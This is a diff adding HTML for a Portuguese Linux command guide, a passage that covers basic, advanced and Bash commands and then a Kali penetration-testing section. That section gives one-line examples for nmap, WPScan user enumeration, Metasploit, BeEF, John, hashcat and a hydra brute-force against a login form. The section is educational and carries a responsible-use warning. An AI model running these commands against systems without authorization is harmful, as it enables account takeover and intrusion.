+              <tr>
+                <td><code>wget</code></td>
+                <td>Baixa arquivos da web</td>
+                <td><code>wget https://example.com/arquivo.zip</code></td>
+              </tr>
+              <tr>
+                <td><code>curl</code></td>
+                <td>Transfere dados de ou para servidores</td>
+                <td><code>curl -O https://example.com/arquivo.zip</code></td>
+              </tr>
+              <tr>
+                <td><code>ssh</code></td>
+                <td>Shell seguro para acesso remoto</td>
+                <td><code>ssh usuario@192.168.1.100</code></td>
+              </tr>
+              <tr>
+                <td><code>scp</code></td>
+                <td>Copia arquivos com segurança entre hosts</td>
+                <td><code>scp arquivo.txt usuario@192.168.1.100:/destino/</code></td>
+              </tr>
+              <tr>
+                <td><code>rsync</code></td>
+                <td>Sincroniza arquivos entre diretórios ou hosts</td>
+                <td><code>rsync -avz /origem/ usuario@host:/destino/</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="info-box">
+          <div class="info-box-title">Dica</div>
+          <p>Para interfaces de rede, o comando <code>ip</code> está substituindo <code>ifconfig</code> em distribuições
+            modernas. É recomendável aprender a usar <code>ip</code> pois <code>ifconfig</code> pode não estar
+            disponível em todas as distribuições.</p>
+        </div>
+      </section>
+
+      <section id="comandos-avancados" class="section">
+        <h2>Comandos Avançados do Linux</h2>
+        <p>Comandos avançados permitem operações mais sofisticadas e são essenciais para usuários intermediários e
+          avançados.</p>
+
+        <h3 id="texto">Processamento de Texto</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>grep</code></td>
+                <td>Procura por padrões em texto</td>
+                <td><code>grep -i 'erro' /var/log/syslog</code></td>
+              </tr>
+              <tr>
+                <td><code>sed</code></td>
+                <td>Editor de fluxo para transformar texto</td>
+                <td><code>sed 's/antigo/novo/g' arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>awk</code></td>
+                <td>Linguagem de processamento de texto poderosa</td>
+                <td><code>awk '{print $1}' arquivo.txt</code> (imprime primeira coluna)</td>
+              </tr>
+              <tr>
+                <td><code>sort</code></td>
+                <td>Ordena linhas de texto</td>
+                <td><code>sort -n arquivo.txt</code> (ordenação numérica)</td>
+              </tr>
+              <tr>
+                <td><code>uniq</code></td>
+                <td>Remove ou conta linhas duplicadas</td>
+                <td><code>uniq -c arquivo.txt</code> (conta ocorrências)</td>
+              </tr>
+              <tr>
+                <td><code>cut</code></td>
+                <td>Remove seções de cada linha</td>
+                <td><code>cut -d',' -f1,3 arquivo.csv</code> (colunas 1 e 3 de CSV)</td>
+              </tr>
+              <tr>
+                <td><code>tr</code></td>
+                <td>Traduz ou deleta caracteres</td>
+                <td><code>cat arquivo.txt | tr '[:lower:]' '[:upper:]'</code></td>
+              </tr>
+              <tr>
+                <td><code>diff</code></td>
+                <td>Compara arquivos linha por linha</td>
+                <td><code>diff arquivo1.txt arquivo2.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>wc</code></td>
+                <td>Conta linhas, palavras e caracteres</td>
+                <td><code>wc -l arquivo.txt</code> (conta linhas)</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Exemplos avançados de <code>grep</code>:</p>
+        <div class="command">
+          <code>grep -r "texto" /diretorio/    # Busca recursiva</code>
+          <button class="copy-btn" data-command="grep -r 'texto' /diretorio/">Copiar</button>
+        </div>
+        <div class="command">
+          <code>grep -v "excluir" arquivo.txt    # Linhas que NÃO contêm o padrão</code>
+          <button class="copy-btn" data-command="grep -v 'excluir' arquivo.txt">Copiar</button>
+        </div>
+        <div class="command">
+          <code>grep -A 2 -B 2 "padrão" arquivo.txt    # Mostra 2 linhas antes e depois</code>
+          <button class="copy-btn" data-command="grep -A 2 -B 2 'padrão' arquivo.txt">Copiar</button>
+        </div>
+
+        <p>Exemplos de <code>sed</code>:</p>
+        <div class="command">
+          <code>sed -i 's/antigo/novo/g' arquivo.txt    # Substituição in-place</code>
+          <button class="copy-btn" data-command="sed -i 's/antigo/novo/g' arquivo.txt">Copiar</button>
+        </div>
+        <div class="command">
+          <code>sed '5d' arquivo.txt    # Deleta a 5ª linha</code>
+          <button class="copy-btn" data-command="sed '5d' arquivo.txt">Copiar</button>
+        </div>
+        <div class="command">
+          <code>sed -n '10,20p' arquivo.txt    # Imprime linhas 10-20</code>
+          <button class="copy-btn" data-command="sed -n '10,20p' arquivo.txt">Copiar</button>
+        </div>
+
+        <h3 id="compressao">Compressão e Arquivamento</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>tar</code></td>
+                <td>Cria/extrai arquivos tar</td>
+                <td><code>tar -czvf arquivo.tar.gz diretorio/</code></td>
+              </tr>
+              <tr>
+                <td><code>gzip</code></td>
+                <td>Comprime arquivos</td>
+                <td><code>gzip arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>gunzip</code></td>
+                <td>Descomprime arquivos .gz</td>
+                <td><code>gunzip arquivo.txt.gz</code></td>
+              </tr>
+              <tr>
+                <td><code>bzip2</code></td>
+                <td>Comprime arquivos (melhor que gzip)</td>
+                <td><code>bzip2 arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>bunzip2</code></td>
+                <td>Descomprime arquivos .bz2</td>
+                <td><code>bunzip2 arquivo.txt.bz2</code></td>
+              </tr>
+              <tr>
+                <td><code>xz</code></td>
+                <td>Comprime arquivos (alta compressão)</td>
+                <td><code>xz arquivo.txt</code></td>
+              </tr>
+              <tr>
+                <td><code>unxz</code></td>
+                <td>Descomprime arquivos .xz</td>
+                <td><code>unxz arquivo.txt.xz</code></td>
+              </tr>
+              <tr>
+                <td><code>zip</code></td>
+                <td>Cria arquivos ZIP</td>
+                <td><code>zip -r arquivo.zip diretorio/</code></td>
+              </tr>
+              <tr>
+                <td><code>unzip</code></td>
+                <td>Extrai arquivos ZIP</td>
+                <td><code>unzip arquivo.zip</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Opções comuns do <code>tar</code>:</p>
+        <div class="info-box">
+          <div class="info-box-title">Mnemônico para tar</div>
+          <ul>
+            <li><code>c</code> - Create (criar)</li>
+            <li><code>x</code> - eXtract (extrair)</li>
+            <li><code>t</code> - lisT (listar)</li>
+            <li><code>v</code> - Verbose (detalhado)</li>
+            <li><code>f</code> - File (arquivo)</li>
+            <li><code>z</code> - gZip</li>
+            <li><code>j</code> - bZip2</li>
+            <li><code>J</code> - XZ</li>
+          </ul>
+        </div>
+
+        <div class="command">
+          <code>tar -czvf backup.tar.gz /home/usuario    # Cria arquivo comprimido</code>
+          <button class="copy-btn" data-command="tar -czvf backup.tar.gz /home/usuario">Copiar</button>
+        </div>
+        <div class="command">
+          <code>tar -xzvf backup.tar.gz    # Extrai arquivo</code>
+          <button class="copy-btn" data-command="tar -xzvf backup.tar.gz">Copiar</button>
+        </div>
+        <div class="command">
+          <code>tar -tzvf backup.tar.gz    # Lista conteúdo sem extrair</code>
+          <button class="copy-btn" data-command="tar -tzvf backup.tar.gz">Copiar</button>
+        </div>
+
+        <h3 id="agendamento">Agendamento de Tarefas</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>crontab</code></td>
+                <td>Agenda tarefas recorrentes</td>
+                <td><code>crontab -e</code> (edita crontab)</td>
+              </tr>
+              <tr>
+                <td><code>at</code></td>
+                <td>Agenda tarefas para execução única</td>
+                <td><code>at now + 1 hour</code></td>
+              </tr>
+              <tr>
+                <td><code>batch</code></td>
+                <td>Executa comandos quando a carga do sistema permitir</td>
+                <td><code>batch</code></td>
+              </tr>
+              <tr>
+                <td><code>systemctl</code></td>
+                <td>Controla serviços systemd e timers</td>
+                <td><code>systemctl list-timers</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Estrutura de uma linha do crontab:</p>
+        <pre>
+# Minuto Hora DiaDaSemana Mês DiaDaSemanada Comando
+0 2 * * * /caminho/para/script.sh   # Executa às 2h todos os dias
+*/10 * * * * comando                # Executa a cada 10 minutos
+0 9-17 * * 1-5 comando              # Executa a cada hora entre 9h-17h, dias úteis</pre>
+
+        <h3 id="sistema">Informações do Sistema</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>uname</code></td>
+                <td>Exibe informações do sistema</td>
+                <td><code>uname -a</code> (todas as infos)</td>
+              </tr>
+              <tr>
+                <td><code>df</code></td>
+                <td>Mostra uso de espaço em disco</td>
+                <td><code>df -h</code> (formato legível)</td>
+              </tr>
+              <tr>
+                <td><code>du</code></td>
+                <td>Estima uso de espaço em arquivos/diretórios</td>
+                <td><code>du -sh /home/*</code> (resumo de cada dir)</td>
+              </tr>
+              <tr>
+                <td><code>free</code></td>
+                <td>Exibe uso de memória</td>
+                <td><code>free -h</code></td>
+              </tr>
+              <tr>
+                <td><code>vmstat</code></td>
+                <td>Estatísticas de memória virtual</td>
+                <td><code>vmstat 1</code> (a cada segundo)</td>
+              </tr>
+              <tr>
+                <td><code>iostat</code></td>
+                <td>Estatísticas de I/O CPU e dispositivos</td>
+                <td><code>iostat -x 2</code></td>
+              </tr>
+              <tr>
+                <td><code>lsof</code></td>
+                <td>Lista arquivos abertos</td>
+                <td><code>lsof -p 1234</code> (arquivos usados pelo PID 1234)</td>
+              </tr>
+              <tr>
+                <td><code>dmesg</code></td>
+                <td>Exibe mensagens do buffer do kernel</td>
+                <td><code>dmesg | grep -i error</code></td>
+              </tr>
+              <tr>
+                <td><code>uptime</code></td>
+                <td>Mostra há quanto tempo o sistema está rodando</td>
+                <td><code>uptime</code></td>
+              </tr>
+              <tr>
+                <td><code>lspci</code></td>
+                <td>Lista dispositivos PCI</td>
+                <td><code>lspci -v</code></td>
+              </tr>
+              <tr>
+                <td><code>lsusb</code></td>
+                <td>Lista dispositivos USB</td>
+                <td><code>lsusb</code></td>
+              </tr>
+              <tr>
+                <td><code>lsblk</code></td>
+                <td>Lista dispositivos de bloco</td>
+                <td><code>lsblk</code></td>
+              </tr>
+              <tr>
+                <td><code>lscpu</code></td>
+                <td>Exibe informações da CPU</td>
+                <td><code>lscpu</code></td>
+              </tr>
+              <tr>
+                <td><code>lshw</code></td>
+                <td>Lista hardware completo</td>
+                <td><code>lshw -short</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Exemplos de monitoramento com comandos avançados:</p>
+        <div class="command">
+          <code>watch -n 1 'free -m'    # Atualiza o comando a cada segundo</code>
+          <button class="copy-btn" data-command="watch -n 1 'free -m'">Copiar</button>
+        </div>
+        <div class="command">
+          <code>iostat -xz 1    # Monitoramento detalhado de IO</code>
+          <button class="copy-btn" data-command="iostat -xz 1">Copiar</button>
+        </div>
+        <div class="command">
+          <code>sar -u 1 3    # Estatísticas de CPU a cada segundo, 3 vezes</code>
+          <button class="copy-btn" data-command="sar -u 1 3">Copiar</button>
+        </div>
+      </section>
+
+      <section id="scripts" class="section">
+        <h2>Shell Scripting</h2>
+        <p>Shell scripting é uma poderosa forma de automatizar tarefas no Linux, combinando comandos e lógica de
+          programação em arquivos executáveis.</p>
+
+        <h3 id="bash">Bash Scripting</h3>
+        <p>Bash (Bourne Again SHell) é o shell padrão em muitas distribuições Linux e oferece uma linguagem de scripting
+          robusta.</p>
+
+        <div class="info-box">
+          <div class="info-box-title">Estrutura Básica de um Script Bash</div>
+          <p>Todo script bash deve começar com o shebang, que indica qual interpretador deve ser usado:</p>
+          <pre>
+#!/bin/bash
+
+# Isto é um comentário
+echo "Olá, Mundo!"
+
+# Terminar com status de saída 0 (sucesso)
+exit 0</pre>
+        </div>
+
+        <p>Para tornar um script executável:</p>
+        <div class="command">
+          <code>chmod +x script.sh    # Torna o script executável</code>
+          <button class="copy-btn" data-command="chmod +x script.sh">Copiar</button>
+        </div>
+        <div class="command">
+          <code>./script.sh    # Executa o script</code>
+          <button class="copy-btn" data-command="./script.sh">Copiar</button>
+        </div>
+
+        <h3 id="variaveis">Variáveis e Condicionais</h3>
+        <p>Bash permite declarar variáveis e usá-las em scripts:</p>
+        <pre>
+#!/bin/bash
+
+# Variáveis
+NOME="Usuário"
+NUMERO=42
+
+# Usar variáveis
+echo "Olá, $NOME!"
+echo "Seu número é $NUMERO"
+
+# Variável de ambiente
+echo "Seu diretório home é $HOME"
+
+# Substituição de comando
+DATA=$(date +%Y-%m-%d)
+echo "A data atual é $DATA"
+
+# Condicional if-else
+if [ $NUMERO -eq 42 ]; then
+echo "O número é 42!"
+elif [ $NUMERO -gt 42 ]; then
+echo "O número é maior que 42!"
+else
+echo "O número é menor que 42!"
+fi
+
+# Testando arquivos
+if [ -f "/etc/passwd" ]; then
+echo "O arquivo /etc/passwd existe."
+fi
+
+if [ -d "/var/log" ]; then
+echo "O diretório /var/log existe."
+fi</pre>
+
+        <div class="info-box">
+          <div class="info-box-title">Operadores de Comparação Numérica</div>
+          <ul>
+            <li><code>-eq</code>: igual</li>
+            <li><code>-ne</code>: não igual</li>
+            <li><code>-gt</code>: maior que</li>
+            <li><code>-lt</code>: menor que</li>
+            <li><code>-ge</code>: maior ou igual</li>
+            <li><code>-le</code>: menor ou igual</li>
+          </ul>
+        </div>
+
+        <div class="info-box">
+          <div class="info-box-title">Operadores para Arquivos e Diretórios</div>
+          <ul>
+            <li><code>-f arquivo</code>: existe e é um arquivo regular</li>
+            <li><code>-d diretorio</code>: existe e é um diretório</li>
+            <li><code>-e caminho</code>: existe (qualquer tipo)</li>
+            <li><code>-r arquivo</code>: existe e tem permissão de leitura</li>
+            <li><code>-w arquivo</code>: existe e tem permissão de escrita</li>
+            <li><code>-x arquivo</code>: existe e tem permissão de execução</li>
+            <li><code>-s arquivo</code>: existe e tem tamanho maior que zero</li>
+          </ul>
+        </div>
+
+        <h3 id="loops">Loops</h3>
+        <p>Bash oferece várias estruturas de loop:</p>
+        <pre>
+#!/bin/bash
+
+# Loop for
+echo "Loop for com lista:"
+for nome in Ana João Pedro Maria; do
+echo "Olá, $nome!"
+done
+
+# Loop for com sequência numérica
+echo "Loop for numérico:"
+for i in {1..5}; do
+echo "Número $i"
+done
+
+# Loop while
+echo "Loop while:"
+contador=1
+while [ $contador -le 5 ]; do
+echo "Contador: $contador"
+((contador++))
+done
+
+# Loop until (até que a condição seja verdadeira)
+echo "Loop until:"
+contador=5
+until [ $contador -eq 0 ]; do
+echo "Contagem regressiva: $contador"
+((contador--))
+done
+
+# Loop for com comando find
+echo "Arquivos no diretório atual:"
+for arquivo in $(find . -type f -name "*.txt"); do
+echo "Arquivo encontrado: $arquivo"
+done</pre>
+
+        <h3 id="funcoes">Funções</h3>
+        <p>Funções permitem organizar e reutilizar código:</p>
+        <pre>
+#!/bin/bash
+
+# Definição de função
+saudacao() {
+echo "Olá, $1!"
+echo "Bem-vindo ao script."
+}
+
+# Função com retorno
+soma() {
+local resultado=$(($1 + $2))
+echo $resultado
+return 0
+}
+
+# Chamada de função com argumento
+saudacao "Usuário"
+
+# Capturando retorno de função
+resultado=$(soma 10 20)
+echo "A soma é: $resultado"
+
+# Função com variáveis locais
+calcular_media() {
+local a=$1
+local b=$2
+local media=$(( (a + b) / 2 ))
+echo "A média de $a e $b é $media"
+}
+
+calcular_media 10 20</pre>
+
+        <div class="info-box warning">
+          <div class="info-box-title">Boas Práticas</div>
+          <ul>
+            <li>Use <code>local</code> para variáveis dentro de funções</li>
+            <li>Documente suas funções com comentários</li>
+            <li>Use valores de retorno para indicar sucesso (0) ou falha (não-zero)</li>
+            <li>Valide entradas para evitar comportamentos inesperados</li>
+            <li>Trate erros adequadamente</li>
+          </ul>
+        </div>
+
+        <p>Exemplo de script completo com tratamento de erros:</p>
+        <pre>
+#!/bin/bash
+
+# Script para backup de arquivos
+# Uso: ./backup.sh /caminho/origem /caminho/destino
+
+# Função para exibir mensagem de erro e sair
+erro() {
+echo "ERRO: $1" >&2
+exit 1
+}
+
+# Verificar número de argumentos
+if [ $# -ne 2 ]; then
+erro "Número incorreto de argumentos. Uso: ./backup.sh origem destino"
+fi
+
+origem="$1"
+destino="$2"
+
+# Verificar se origem existe
+if [ ! -d "$origem" ]; then
+erro "Diretório de origem não existe: $origem"
+fi
+
+# Verificar se destino existe, senão criar
+if [ ! -d "$destino" ]; then
+mkdir -p "$destino" || erro "Não foi possível criar o diretório de destino: $destino"
+fi
+
+# Nome do arquivo de backup
+data=$(date +%Y%m%d_%H%M%S)
+arquivo_backup="backup_$data.tar.gz"
+caminho_completo="$destino/$arquivo_backup"
+
+# Realizar backup
+echo "Iniciando backup de $origem para $caminho_completo..."
+tar -czf "$caminho_completo" -C "$(dirname "$origem")" "$(basename "$origem")" || erro "Falha ao criar arquivo tar"
+
+# Verificar resultado
+if [ -f "$caminho_completo" ]; then
+tamanho=$(du -h "$caminho_completo" | cut -f1)
+echo "Backup concluído com sucesso: $caminho_completo ($tamanho)"
+exit 0
+else
+erro "Backup falhou: arquivo não foi criado"
+fi</pre>
+      </section>
+
+      <section id="cybersec-tools" class="section cybersec">
+        <h2>Ferramentas de Cybersegurança</h2>
+        <p>Esta seção cobre ferramentas populares de cybersegurança, especialmente aquelas disponíveis no Kali Linux,
+          uma distribuição focada em testes de penetração e auditoria de segurança.</p>
+
+        <div class="info-box cybersec">
+          <div class="info-box-title">Aviso de Uso Responsável</div>
+          <p>As ferramentas nesta seção são poderosas e devem ser usadas apenas em ambientes para os quais você tenha
+            autorização explícita para testar. O uso destas ferramentas contra sistemas sem permissão pode violar leis
+            locais e internacionais.</p>
+        </div>
+
+        <h3 id="recon">Ferramentas de Reconhecimento</h3>
+        <p>O reconhecimento é a primeira fase de um teste de penetração, onde se coleta informações sobre o alvo.</p>
+
+        <div class="comparison-grid">
+          <div class="card">
+            <div class="card-header">Whois <span class="tool-category recon">RECON</span></div>
+            <p>Consulta informações de registro de domínios.</p>
+            <div class="command">
+              <code>whois example.com</code>
+              <button class="copy-btn" data-command="whois example.com">Copiar</button>
+            </div>
+            <p>Informações obtidas:</p>
+            <ul>
+              <li>Proprietário do domínio</li>
+              <li>Servidores DNS</li>
+              <li>Datas de criação e expiração</li>
+              <li>Contatos administrativos e técnicos</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Dmitry <span class="tool-category recon">RECON</span></div>
+            <p>Ferramenta para coleta de informações diversas sobre hosts.</p>
+            <div class="command">
+              <code>dmitry -winsepo resultado.txt example.com</code>
+              <button class="copy-btn" data-command="dmitry -winsepo resultado.txt example.com">Copiar</button>
+            </div>
+            <p>Opções comuns:</p>
+            <ul>
+              <li><code>-w</code>: Whois</li>
+              <li><code>-i</code>: Informações de netcraft</li>
+              <li><code>-n</code>: Busca de subdomínios</li>
+              <li><code>-s</code>: Scan de portas</li>
+              <li><code>-e</code>: Busca de e-mails</li>
+              <li><code>-p</code>: TCP port scan</li>
+              <li><code>-o</code>: Salva output em arquivo</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">TheHarvester <span class="tool-category recon">RECON</span></div>
+            <p>Coleta e-mails, subdomínios, hosts, nomes de funcionários, portas abertas e banners.</p>
+            <div class="command">
+              <code>theHarvester -d example.com -l 500 -b all</code>
+              <button class="copy-btn" data-command="theHarvester -d example.com -l 500 -b all">Copiar</button>
+            </div>
+            <p>Opções principais:</p>
+            <ul>
+              <li><code>-d</code>: Domínio para buscar</li>
+              <li><code>-l</code>: Limite de resultados</li>
+              <li><code>-b</code>: Fontes de busca (google, bing, linkedin, etc.)</li>
+              <li><code>-f</code>: Salva resultados em arquivo HTML e XML</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Recon-ng <span class="tool-category recon">RECON</span></div>
+            <p>Framework completo para reconhecimento com módulos organizados.</p>
+            <div class="command">
+              <code>recon-ng</code>
+              <button class="copy-btn" data-command="recon-ng">Copiar</button>
+            </div>
+            <p>Comandos básicos:</p>
+            <pre>
+# Dentro do Recon-ng
+marketplace search
+marketplace install recon/domains-hosts/google_site_web
+modules load recon/domains-hosts/google_site_web
+options set SOURCE example.com
+run</pre>
+          </div>
+        </div>
+
+        <h3 id="scanners">Scanners</h3>
+        <p>Scanners são usados para identificar hosts, portas abertas, serviços e potenciais vulnerabilidades.</p>
+
+        <div class="card">
+          <div class="card-header">Nmap <span class="tool-category recon">RECON</span></div>
+          <p>O "canivete suíço" de scanners de rede. Detecta hosts, portas, serviços, sistemas operacionais e mais.</p>
+          <div class="command">
+            <code>nmap -sS -A -T4 192.168.1.0/24</code>
+            <button class="copy-btn" data-command="nmap -sS -A -T4 192.168.1.0/24">Copiar</button>
+          </div>
+          <p>Tipos comuns de scan:</p>
+          <ul>
+            <li><code>-sS</code>: SYN scan (rápido e discreto)</li>
+            <li><code>-sT</code>: TCP connect scan (completo)</li>
+            <li><code>-sU</code>: UDP scan</li>
+            <li><code>-sV</code>: Detecção de versão de serviços</li>
+            <li><code>-O</code>: Detecção de sistema operacional</li>
+            <li><code>-A</code>: Scan agressivo (OS + versão + scripts + traceroute)</li>
+            <li><code>-p-</code>: Todas as portas</li>
+            <li><code>-T4</code>: Velocidade (0-5, 5 é mais rápido)</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Nikto <span class="tool-category recon">RECON</span></div>
+          <p>Scanner de vulnerabilidades para servidores web, identifica arquivos perigosos, softwares desatualizados e
+            problemas comuns.</p>
+          <div class="command">
+            <code>nikto -h http://example.com</code>
+            <button class="copy-btn" data-command="nikto -h http://example.com">Copiar</button>
+          </div>
+          <p>Opções úteis:</p>
+          <ul>
+            <li><code>-ssl</code>: Usar SSL para conexão</li>
+            <li><code>-port 8080</code>: Especificar porta</li>
+            <li><code>-output relatorio.html</code>: Salvar resultados</li>
+            <li><code>-Tuning x</code>: Realizar testes específicos</li>
+            <li><code>-evasion 1</code>: Técnicas de evasão de detecção</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">OpenVAS <span class="tool-category recon">RECON</span></div>
+          <p>Framework de scanners de vulnerabilidades com interface web.</p>
+          <div class="command">
+            <code>gvm-start</code>
+            <button class="copy-btn" data-command="gvm-start">Copiar</button>
+          </div>
+          <p>Características:</p>
+          <ul>
+            <li>Mais de 50.000 testes de vulnerabilidades</li>
+            <li>Escaneamento completo de redes e sistemas</li>
+            <li>Relatórios detalhados</li>
+            <li>Gerenciamento de vulnerabilidades</li>
+            <li>Atualizações regulares de feeds de segurança</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">WPScan <span class="tool-category recon">RECON</span></div>
+          <p>Scanner de segurança específico para WordPress.</p>
+          <div class="command">
+            <code>wpscan --url http://example.com --enumerate u</code>
+            <button class="copy-btn" data-command="wpscan --url http://example.com --enumerate u">Copiar</button>
+          </div>
+          <p>Opções de enumeração:</p>
+          <ul>
+            <li><code>--enumerate u</code>: Usuários</li>
+            <li><code>--enumerate p</code>: Plugins</li>
+            <li><code>--enumerate t</code>: Temas</li>
+            <li><code>--enumerate vp</code>: Plugins vulneráveis</li>
+            <li><code>--api-token TOKEN</code>: Usar API para mais dados de vulnerabilidades</li>
+          </ul>
+        </div>
+
+        <h3 id="exploits">Exploits e Frameworks</h3>
+        <p>Ferramentas que auxiliam na exploração de vulnerabilidades descobertas durante os testes.</p>
+
+        <div class="card">
+          <div class="card-header">Metasploit Framework <span class="tool-category exploit">EXPLOIT</span></div>
+          <p>O mais completo framework para desenvolvimento e execução de exploits.</p>
+          <div class="command">
+            <code>msfconsole</code>
+            <button class="copy-btn" data-command="msfconsole">Copiar</button>
+          </div>
+          <p>Estrutura:</p>
+          <ul>
+            <li><strong>Exploits</strong>: Código que tira proveito de vulnerabilidades</li>
+            <li><strong>Payloads</strong>: Código a ser executado após exploração bem-sucedida</li>
+            <li><strong>Auxiliares</strong>: Módulos para scanners, fuzzing, etc.</li>
+            <li><strong>Encoders</strong>: Codificadores para evasão de detecção</li>
+            <li><strong>Post</strong>: Módulos de pós-exploração</li>
+          </ul>
+          <p>O Metasploit será discutido em detalhes em uma seção dedicada.</p>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Searchsploit <span class="tool-category exploit">EXPLOIT</span></div>
+          <p>CLI para buscar no banco de dados do Exploit-DB.</p>
+          <div class="command">
+            <code>searchsploit apache 2.4.7</code>
+            <button class="copy-btn" data-command="searchsploit apache 2.4.7">Copiar</button>
+          </div>
+          <p>Opções úteis:</p>
+          <ul>
+            <li><code>-x ID</code>: Examinar exploit específico</li>
+            <li><code>-m ID</code>: Copiar exploit para diretório atual</li>
+            <li><code>-w</code>: Mostrar URL do Exploit-DB</li>
+            <li><code>--exclude="tipo|plataforma"</code>: Excluir resultados indesejados</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">BeEF (Browser Exploitation Framework) <span
+              class="tool-category exploit">EXPLOIT</span></div>
+          <p>Framework dedicado à exploração de navegadores web.</p>
+          <div class="command">
+            <code>beef-xss</code>
+            <button class="copy-btn" data-command="beef-xss">Copiar</button>
+          </div>
+          <p>Funcionalidades:</p>
+          <ul>
+            <li>Hooking de navegadores (infectar navegadores-alvo)</li>
+            <li>Interface de comandos e controle</li>
+            <li>Ampla variedade de módulos para interagir com navegadores infectados</li>
+            <li>Capacidade de pivoting para outros alvos na rede</li>
+            <li>Social engineering através do navegador</li>
+          </ul>
+        </div>
+
+        <h3 id="passwords">Cracking de Senhas</h3>
+        <p>Ferramentas para testar e quebrar senhas através de diferentes métodos.</p>
+
+        <div class="card">
+          <div class="card-header">John the Ripper <span class="tool-category password">PASSWORD</span></div>
+          <p>Ferramenta rápida para cracking de senhas locais.</p>
+          <div class="command">
+            <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
+            <button class="copy-btn"
+              data-command="john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt">Copiar</button>
+          </div>
+          <p>Suporta vários formatos:</p>
+          <ul>
+            <li>Hashes de senhas UNIX/Linux/Windows</li>
+            <li>MD5, SHA1, SHA256, etc.</li>
+            <li>Arquivos protegidos por senha (ZIP, RAR, PDF)</li>
+            <li>Modos de ataque: wordlist, brute force, regras</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Hashcat <span class="tool-category password">PASSWORD</span></div>
+          <p>Ferramenta de cracking de senhas com aceleração por GPU.</p>
+          <div class="command">
+            <code>hashcat -m 0 -a 0 hash.txt wordlist.txt</code>
+            <button class="copy-btn" data-command="hashcat -m 0 -a 0 hash.txt wordlist.txt">Copiar</button>
+          </div>
+          <p>Modos de ataque (<code>-a</code>):</p>
+          <ul>
+            <li><code>0</code>: Wordlist</li>
+            <li><code>1</code>: Combinação</li>
+            <li><code>3</code>: Brute force</li>
+            <li><code>6</code>: Híbrido (wordlist + máscara)</li>
+            <li><code>7</code>: Híbrido (máscara + wordlist)</li>
+          </ul>
+          <p>Exemplos de hashmode (<code>-m</code>):</p>
+          <ul>
+            <li><code>0</code>: MD5</li>
+            <li><code>100</code>: SHA1</li>
+            <li><code>1800</code>: SHA512crypt (Linux)</li>
+            <li><code>1000</code>: NTLM</li>
+            <li><code>3000</code>: MySQL</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Hydra <span class="tool-category password">PASSWORD</span></div>
+          <p>Ferramenta para ataque de força bruta em logins online.</p>
+          <div class="command">
+            <code>hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"</code>
+            <button class="copy-btn"
+              data-command="hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login.php:username=^USER^&password=^PASS^:Login failed'">Copiar</button>
+          </div>
+          <p>Protocolos suportados:</p>
+          <ul>
+            <li>HTTP(S), FTP, SSH, Telnet, SMTP, SNMP</li>
+            <li>SMB, RDP, VNC, IMAP, POP3</li>
+            <li>MySQL, PostgreSQL, Oracle, MSSQL</li>
+          </ul>
+        </div>
+
+        <h3 id="sniffers">Sniffers e Análise de Tráfego</h3>
+        <p>Ferramentas que capturam e analisam pacotes de rede.</p>
+
+        <div class="card">
+          <div class="card-header">Wireshark <span class="tool-category recon">RECON</span></div>
+          <p>Analisador de protocolo de rede com interface gráfica.</p>
+          <div class="command">
+            <code>wireshark</code>
+            <button class="copy-btn" data-command="wireshark">Copiar</button>
+          </div>
+          <p>Recursos:</p>
+          <ul>
+            <li>Captura e análise de pacotes em tempo real</li>
+            <li>Protocolos coloridos para fácil identificação</li>
+            <li>Suporte a centenas de protocolos</li>
+            <li>Filtros poderosos</li>
+            <li>Inspeção profunda de pacotes</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">tcpdump <span class="tool-category recon">RECON</span></div>
+          <p>Ferramenta de linha de comando para captura e análise de pacotes.</p>
+          <div class="command">
+            <code>tcpdump -i eth0 -n -v port 80</code>
+            <button class="copy-btn" data-command="tcpdump -i eth0 -n -v port 80">Copiar</button>
+          </div>
+          <p>Opções comuns:</p>
+          <ul>
+            <li><code>-i interface</code>: Interface para captura</li>
+            <li><code>-n</code>: Não resolver hostnames</li>
+            <li><code>-v, -vv, -vvv</code>: Verbosidade crescente</li>
+            <li><code>-w arquivo.pcap</code>: Salvar captura para arquivo</li>
+            <li><code>-r arquivo.pcap</code>: Ler de um arquivo</li>
+          </ul>
+          <p>Exemplos de expressões de filtro:</p>
+          <ul>
